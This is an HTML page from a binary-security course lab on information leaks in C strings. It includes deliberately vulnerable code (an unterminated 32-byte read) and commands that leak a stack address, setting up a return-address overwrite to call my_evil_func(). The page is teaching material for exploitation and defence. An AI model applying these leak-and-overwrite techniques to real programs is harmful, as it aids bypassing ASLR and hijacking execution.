<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper docs-doc-page docs-version-current plugin-docs plugin-id-default docs-doc-id-Mitigation and Defensive Strategies/Information Leaks/Reading/README">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v2.1.0">
<title data-rh="true">Information Leaks | Binary Security</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="http://open-education-hub.github.io/binary-security/Mitigation and Defensive Strategies/Information Leaks/Reading/"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Information Leaks | Binary Security"><meta data-rh="true" name="description" content="Introduction"><meta data-rh="true" property="og:description" content="Introduction"><link data-rh="true" rel="canonical" href="http://open-education-hub.github.io/binary-security/Mitigation and Defensive Strategies/Information Leaks/Reading/"><link data-rh="true" rel="alternate" href="http://open-education-hub.github.io/binary-security/Mitigation and Defensive Strategies/Information Leaks/Reading/" hreflang="en"><link data-rh="true" rel="alternate" href="http://open-education-hub.github.io/binary-security/Mitigation and Defensive Strategies/Information Leaks/Reading/" hreflang="x-default"><link rel="stylesheet" href="/binary-security/assets/css/styles.a69a9d41.css">
<link rel="preload" href="/binary-security/assets/js/runtime~main.74200969.js" as="script">
<link rel="preload" href="/binary-security/assets/js/main.d9be8505.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"light")}()</script><div id="__docusaurus">
<div role="region" aria-label="theme.common.skipToMainContent"><a href="#" class="skipToContent_fXgn">Skip to main content</a></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Navigation bar toggle" class="navbar__toggle clean-btn" type="button" tabindex="0"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/binary-security/"><div class="navbar__logo"><img src="/binary-security/img/logo.svg" alt="Logo" class="themedImage_ToTc themedImage--light_HNdA"><img src="/binary-security/img/logo.svg" alt="Logo" class="themedImage_ToTc themedImage--dark_i4oU"></div><b class="navbar__title text--truncate">Binary Security</b></a><a class="navbar__item navbar__link" href="/binary-security/Binary Analysis">Binary Analysis</a><a class="navbar__item navbar__link" href="/binary-security/Exploitation Techniques">Exploitation Techniques</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/binary-security/Mitigation and Defensive Strategies">Mitigation and Defensive Strategies</a><a class="navbar__item navbar__link" href="/binary-security/Extra">Extra</a></div><div class="navbar__items navbar__items--right"><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="searchBox_ZlJk"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div class="main-wrapper mainWrapper_z2l0 docsWrapper_BCFX"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docPage__5DB"><aside class="theme-doc-sidebar-container docSidebarContainer_b6E3"><div class="sidebar_njMd"><nav class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/binary-security/">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/binary-security/Binary Analysis/">Binary Analysis</a><button aria-label="Toggle the collapsible sidebar category &#x27;Binary Analysis&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/binary-security/Exploitation Techniques/">Exploitation Techniques</a><button aria-label="Toggle the collapsible sidebar category &#x27;Exploitation Techniques&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" aria-expanded="true" href="/binary-security/Mitigation and Defensive Strategies/">Mitigation and Defensive Strategies</a><button aria-label="Toggle the collapsible sidebar category &#x27;Mitigation and Defensive Strategies&#x27;" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" tabindex="0" href="/binary-security/Mitigation and Defensive Strategies/Defense Mechanisms/">Defense Mechanisms</a><button aria-label="Toggle the collapsible sidebar category &#x27;Defense Mechanisms&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" aria-expanded="true" tabindex="0" href="/binary-security/Mitigation and Defensive Strategies/Information Leaks/">Information Leaks</a><button aria-label="Toggle the collapsible sidebar category &#x27;Information Leaks&#x27;" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/binary-security/Mitigation and Defensive Strategies/Information Leaks/Reading/">Reading</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" tabindex="0" href="/binary-security/Mitigation and Defensive Strategies/Bypassing Mitigations/">Bypassing Mitigations</a><button aria-label="Toggle the collapsible sidebar category &#x27;Bypassing Mitigations&#x27;" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/binary-security/Extra/">Extra</a><button aria-label="Toggle the collapsible sidebar category &#x27;Extra&#x27;" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav><button type="button" title="Collapse sidebar" aria-label="Collapse sidebar" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></aside><main class="docMainContainer_gTbr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/binary-security/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_OVgt"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/binary-security/Mitigation and Defensive Strategies/"><span itemprop="name">Mitigation and Defensive Strategies</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/binary-security/Mitigation and Defensive Strategies/Information Leaks/"><span itemprop="name">Information Leaks</span></a><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Reading</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><h1>Information Leaks</h1><h2 class="anchor anchorWithStickyNavbar_LWe7" id="introduction">Introduction<a class="hash-link" href="#introduction" title="Direct link to heading">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="objectives--rationale">Objectives &amp; Rationale<a class="hash-link" href="#objectives--rationale" title="Direct link to heading">​</a></h3><p>This is a tutorial based lab.
Throughout this lab you will learn about frequent errors that occur when handling strings.
This tutorial is focused on the C language.
Generally, object-oriented programming languages (like Java, C#,C++) are using classes to represent strings -- this simplifies the way strings are handled and decreases the frequency of programming errors.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="what-is-a-string">What is a String?<a class="hash-link" href="#what-is-a-string" title="Direct link to heading">​</a></h3><p>Conceptually, a string is sequence of characters.
The representation of a string can be done in multiple ways.
One of the way is to represent a string as a contiguous memory buffer.
Each character is <strong>encoded</strong> in a way.
For example the <strong>ASCII</strong> encoding uses 7-bit integers to encode each character -- because it is more convenient to store 8-bits at a time in a byte, an ASCII character is stored in one byte.</p><p>The type for representing an ASCII character in C is <code>char</code> and it uses one byte.
As a side note, <code>sizeof(char) == 1</code> is the only guarantee that the <a href="http://www.open-std.org/jtc1/sc22/WG14/www/docs/n1256.pdf" target="_blank" rel="noopener noreferrer" title="http://www.open-std.org/jtc1/sc22/WG14/www/docs/n1256.pdf">C standard</a> gives.</p><p>Another encoding that can be used is Unicode (with UTF8, UTF16, UTF32 etc.  as mappings).
The idea is that in order to represent an Unicode string, <strong>more than one</strong> byte is needed for <strong>one</strong> character.
<code>char16_t</code>, <code>char32_t</code> were introduced in the C standard to represent these strings.
The C language also has another type, called <code>wchar_t</code>, which is implementation defined and should not be used to represent Unicode characters.</p><p>Our tutorial will focus on ASCII strings, where each character is represented in one byte.
We will show a few examples of what happens when one calls <em>string manipulation functions</em> that are assuming a specific encoding of the string.</p><p>You will find extensive information on ASCII in the <a href="http://man7.org/linux/man-pages/man7/ascii.7.html" target="_blank" rel="noopener noreferrer" title="http://man7.org/linux/man-pages/man7/ascii.7.html">ascii man page</a>.</p><p>Inside an Unix terminal issue the command</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">man ascii</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="length-management">Length Management<a class="hash-link" href="#length-management" title="Direct link to heading">​</a></h3><p>In C, the length of an ASCII string is given by its contents.
An ASCII string ends with a <code>0</code> value byte called the <code>NUL</code> byte.
Every <code>str*</code> function (i.e. a function with the name starting with <code>str</code>, such as <code>strcpy</code>, <code>strcat</code>, <code>strdup</code>, <code>strstr</code> etc.) uses this <code>0</code> byte to detect where the string ends.
As a result, not ending strings in <code>0</code> and using <code>str*</code> functions leads to vulnerabilities.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="1-basic-info-leak-tutorial">1. Basic Info Leak (tutorial)<a class="hash-link" href="#1-basic-info-leak-tutorial" title="Direct link to heading">​</a></h2><p>Enter the <code>01-basic-info-leak/</code> subfolder.
It&#x27;s a basic information leak example.</p><p>In <code>basic_info_leak.c</code>, <code>buf</code> is supplied as input, hence is not trusted.
We should be careful with this buffer.
If the user gives <code>32</code> bytes as input then <code>strcpy</code> will copy bytes in <code>my_string</code> until it finds a <code>NUL</code> byte (<code>0x00</code>).
Because the <a title="cns:labs:lab-05" href="/binary-security/courses/cns/labs/lab-05">stack grows down</a>, on most platforms, we will start accessing the content of the stack.
After the <code>buf</code> variable the stack stores the <code>old rbp</code>, the function return address and then the function parameters.
This information is copied into <code>my_string</code>.
As such, printing information in <code>my_string</code> (after byte index <code>32</code>) using <code>puts()</code> results in information leaks.</p><p>We can test this using:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ python -c &#x27;print(&quot;A&quot;*32)&#x27; | ./basic_info_leak</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�8�</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>In order to check the hexadecimal values of the leak, we pipe the output
through <code>xxd</code>:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ python -c &#x27;print(&quot;A&quot;*32)&#x27; | ./basic_info_leak | xxd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00000020: d066 57b4 fc7f 0a                        .fW....</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We have leaked one value above:</p><ul><li>the lower non-0 bytes of the old/stored <code>rbp</code> value (right after the buffer)</li><li><code>0x7ffcb45766d0</code> (it&#x27;s a little endian architecture);
it will differ on your system</li></ul><p>The return address usually doesn&#x27;t change (except for executables with PIE, <em>Position Independent Executable</em> support).
But assuming ASLR is enabled, the <code>rbp</code> value changes at each run.
If we leak it we have a basic address that we can toy around to leak or overwrite other values.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="2-information-leak">2. Information Leak<a class="hash-link" href="#2-information-leak" title="Direct link to heading">​</a></h2><p>We will now show how improper string handling will lead to information leaks from the memory.
For this, please access the <code>02-info-leak/</code> subfolder.
Please browse the <code>info-leak.c</code> source code file.</p><p>The snippet below is the relevant code snippet.
The goal is to call the <code>my_evil_func()</code> function.
One of the building blocks of exploiting a vulnerability is to see whether or not we have memory write.
If you have memory writes, then getting code execution is a matter of getting things right.
In this task we are assuming that we have memory write (i.e. we can write any value at any address).
You can call the <code>my_evil_func()</code> function by overriding the return address of the <code>my_main()</code> function:</p><div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">define</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property macro-name" style="color:#36acaa">NAME_SZ</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property expression number" style="color:#36acaa">32</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">read_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">memset</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> NAME_SZ</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">read</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> NAME_SZ</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">//name[NAME_SZ-1] = 0;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">my_main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">void</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> name</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">NAME_SZ</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">read_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;hello %s, what address to modify and with what value?\n&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">fflush</span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">stdout</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">my_memory_write</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Returning from main!\n&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>What catches our eye is that the <code>read()</code> function call in the <code>read_name()</code> function read <strong>exactly</strong> <code>32</code> bytes.
If we provide it <code>32</code> bytes it won&#x27;t be null-terminated and will result in an information leak when <code>printf()</code> is called in the <code>my_main()</code> function.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="exploiting-the-memory-write-using-the-info-leak">Exploiting the Memory Write Using the Info Leak<a class="hash-link" href="#exploiting-the-memory-write-using-the-info-leak" title="Direct link to heading">​</a></h3><p>Let&#x27;s first try to see how the program works:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ python -c &#x27;import sys; sys.stdout.write(10*&quot;A&quot;)&#x27; | ./info_leak</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">hello AAAAAAAAAA, what address to modify and with what value?</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The binary wants an input from the user using the <code>read()</code> library call as we can see below:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ python -c &#x27;import sys; sys.stdout.write(10*&quot;A&quot;)&#x27; | strace -e read ./info_leak</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">read(3, &quot;\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\203\1\0004\0\0\0&quot;..., 512) = 512</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">read(0, &quot;AAAAAAAAAA&quot;, 32)               = 10</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">hello AAAAAAAAAA, what address to modify and with what value?</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">read(0, &quot;&quot;, 4)                          = 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">+++ exited with 255 +++</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The input is read using the <code>read()</code> system call.
The first read expects 32 bytes.
